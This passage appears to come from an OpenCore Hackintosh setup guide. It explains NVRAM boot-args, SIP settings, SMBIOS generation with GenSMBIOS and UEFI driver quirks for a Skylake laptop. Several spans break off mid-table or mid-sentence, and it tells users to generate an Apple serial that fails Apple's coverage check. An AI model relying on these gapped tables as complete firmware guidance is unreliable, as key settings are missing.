problem\n              kexts, etc.\ndebug=0x100   this disables macos's watchdog which helps prevents a reboot\n              on a kernel panic. that way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    this is a companion setting to debug=0x100 that tells the os\n              to also print the symbols on a kernel panic. that can give\n              some more helpful insight as to what's causing the panic\n              itself.\nalcid=1       used for setting layout-id for applealc, see supported\n              codecs to figure out which layout to use for your specific\n              system. more info on this is covered in the post-install\n              page\n\n * gpu-specific boot-args:\n\nboot-args              description\n-wegnoegpu             used for disabling all other gpus than the integrated intel\n                       igpu, useful for those wanting to run newer versions of\n                       macos where their dgpu isn't supported\n-igfxnotelemetryload   prevents igpu telemetry from loading. igpu telemetry may\n                       cause a freeze during startup on certain laptops such as\n                       chromebooks on macos 10.15 and higher, see here for more\n                       information.\n\n * csr-active-config: 00000000\n   \n   * settings for 'system integrity protection' (sip). it is generally recommended to change this with csrutil via the recovery partition.\n   * csr-active-config by default is set to 00000000 which enables system integrity protection. you can choose a number of different values but overall we recommend keeping this enabled for best security practices. more info can be found in our troubleshooting page: disabling sip\n\n * run-efi-updater: no\n   \n   * this is used to prevent apple's firmware update packages from installing and breaking boot order; this is important as these firmware updates (meant for macs) will not work.\n\n * prev-lang:kbd: <>\n   \n   * needed for non-latin keyboards in the format of lang-country:keyboard, recommended to keep blank though you can specify it(default in sample config is russian):\n   * american: en-us:0(656e2d55533a30 in hex)\n   * full list can be found in applekeyboardlayouts.txt\n   * hint: prev-lang:kbd can be changed into a string so you can input en-us:0 directly instead of converting to hex\n   * hint 2: prev-lang:kbd can be set to a blank variable (eg. <>) which will force the language picker to appear instead at first boot up.\n\nkey             type     value\nprev-lang:kbd   string   en-us:0\n\n\n# delete\n\nforcibly rewrites nvram variables, do note that add will not overwrite values already present in nvram so values like boot-args should be left alone.\n\n * legacyschema\n   \n   * used for assigning nvram variables, used with openvariableruntimedxe.efi. only needed for systems without native nvram\n\n * writeflash: yes\n   \n   * enables writing to flash memory for all added variables.\n\n\n# platforminfo\n\n\n\ninfo\n\nfor setting up the smbios info, we'll use corpnewt's gensmbios application.\n\nfor this skylake example, we'll choose the macbookpro13,1 smbios. the typical breakdown is as follows:\n\nsmbios           cpu type                  gpu type                                  display size   touch id\nmacbook9,1

          yes\nimac17,1         nuc systems               igpu: hd 530 + r9 290                     n/a            no\n\nnote 2: all of these smbioses were dropped in macos ventura. if running macos ventura, use a kaby lake smbios.\n\nrun gensmbios, pick option 1 for downloading macserial and option 3 for selecting out smbios. this will give us an output similar to the following:\n\n

iservices page on how to find your real mac address)\n\nreminder that you need an invalid serial! when inputting your serial number in apple's check coverage page, you should get a message such as \"unable to check coverage for this serial number.\"\n\nautomatic: yes\n\n * generates platforminfo based on generic section instead of datahub, nvram, and smbios sections\n\n\n# generic\n\nmore

compatibility. use at your own risk\n\n\n# uefi\n\n\n\nconnectdrivers: yes\n\n * forces .efi drivers, change to no will automatically connect added uefi drivers. this can make booting slightly faster, but not all drivers connect themselves. e.g. certain file system drivers may not load.\n\n\n# drivers\n\nadd your .efi drivers here.\n\nonly drivers present here should be:\n\n * hfsplus.efi\n *

firmware driver, needed for when your firmware doesn't support ehci/xhci handoff. most laptops have garbage firmwares so we'll need this as well\n\n * disablesecuritypolicy: no\n   \n   * disables platform security policy in firmware, recommended for buggy firmwares where disabling secure boot does not allow 3rd party firmware drivers to load.\n   * if running a microsoft surface device, recommended to enable this option\n\n * requestbootvarrouting: yes\n   \n   * redirects aptiomemoryfix from efi_global_variable_guid to oc_vendor_variable_guid. needed for when firmware tries to delete boot entries and is recommended to be enabled on all systems for correct update installation, startup disk control panel functioning, etc.\n\n * unblockfsconnect: no\n   \n   * some firmware block partition handles by opening them in by driver mode, which results in file system protocols being unable to install. mainly relevant for hp systems when no drives are listed\n\n\n# reservedmemory\n\nused for exempting certain memory regions from oses to use, mainly relevant for sandy bridge igpus or systems with faulty memory. use of this quirk is not covered in this
